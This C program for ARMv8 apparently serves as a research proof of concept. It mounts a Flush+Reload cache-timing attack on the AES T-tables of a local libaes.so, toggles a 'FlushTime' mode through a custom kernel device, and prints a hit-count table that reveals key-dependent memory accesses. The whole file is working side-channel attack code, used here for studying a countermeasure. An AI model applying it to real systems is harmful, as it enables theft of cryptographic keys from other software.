#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <assert.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <time.h>
#include "aes.h"


#define NUMBER_OF_ENCRYPTIONS (1000)

#define TRAP 1
#define FLUSHTIME_ENABLE 1


unsigned char key[] =
{
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x51, 0x4d, 0xab, 0x12, 0xff, 0xdd, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};


size_t sum;
size_t scount;

size_t timings[16][16];


void arm_v8_flush(void* address)
{
  asm volatile ("DC CIVAC, %0" :: "r"(address));
  asm volatile ("DSB ISH");
  asm volatile ("ISB");
}


uint64_t arm_v8_get_timing(void)
{
	// struct timespec time = {0, 0};
	// clock_gettime(CLOCK_REALTIME, &time);	
	// return time.tv_nsec;
	
	asm volatile ("DSB ISH");
	asm volatile ("ISB");	
	uint64_t res;	
	asm volatile("mrs %0, cntvct_el0" : "=r" (res) :: "memory");
	return res;
}


void arm_v8_access_memory(void* pointer)
{
  volatile uint32_t value;
  asm volatile ("LDR %0, [%1]\n\t"
      : "=r" (value)
      : "r" (pointer)
      );
}


int main()
{
	size_t byte, i, j, k, l;
	long long time1,time2,time3;
	int fd1,fd2;

	char* base;
	char* probe;
	char* end;	

	unsigned long junk=0;
	
	fd1 = open("/dev/hello_device", O_RDWR);

	
#if FLUSHTIME_ENABLE==0	
	read(fd1,0,0);  // FlushTime_enable==0
	printf("FLUSHTIME_ENABLE==0\n");	
#endif

#if FLUSHTIME_ENABLE==1
	read(fd1,0,10);	// FlushTime_enable==0xdeadbeaf
	printf("FLUSHTIME_ENABLE==1\n");
#endif
	
	fd2 = open("./libaes.so", O_RDONLY);	
	size_t size = lseek(fd2, 0, SEEK_END);
	if (size == 0)
	exit(-1);
	size_t map_size = size;
	if (map_size & 0xFFF != 0)
	{
	map_size |= 0xFFF;
	map_size += 1;
	}	
	base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd2, 0);
	end = base + size;
	
	unsigned char plaintext[] =
	{
	0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
	};

	unsigned char ciphertext[128];
	unsigned char restoredtext[128];

	AES_KEY key_struct;

	AES_set_encrypt_key(key, 128, &key_struct);

	sum = 0;
	
	
	for(l=0;l<16;l++)
	{
		byte = l*16;
		plaintext[0] = byte;
		AES_encrypt(plaintext, ciphertext, &key_struct);

		int te0 = 0x30c8;
		int te1 = 0x34c8;
		int te2 = 0x38c8;
		int te3 = 0x3cc8;	
		
		
		for(k=0;k<16;k++) // 16    
		{
			probe = base+te0+k*64;
			size_t count = 0;
			for(i = 0; i < NUMBER_OF_ENCRYPTIONS; ++i)
			{
				for (j = 1; j < 16; ++j)
					plaintext[j] = rand() % 256;
				
				arm_v8_flush((void*)probe);
				AES_encrypt(plaintext, ciphertext, &key_struct);
				sched_yield();

				time1=arm_v8_get_timing();
				arm_v8_access_memory(probe);
				time2=arm_v8_get_timing();
				time3 = time2 - time1;
#if TRAP==1				
				if(time3 < 15) // SCTLR_EL1.UCI==0, trap
#endif

#if (TRAP==1) && (FLUSHTIME_ENABLE==1)			
				if(time3 < 1) // SCTLR_EL1.UCI==0, trap
#endif

#if TRAP==0
				if(time3 < 4) // SCTLR_EL1.UCI==1, not trap.
#endif

					++count;
			}
			sched_yield();
			timings[k][l] = count;
			sched_yield();
		}
	}
	
	for (k=0;k<16;k++)
	{
		printf("%lx",k);
		for (l=0;l<16;l++)
		{
			printf(",%6lu",timings[k][l]);
		}
		printf("\n");
	}	
		
	
	return 0;	
}








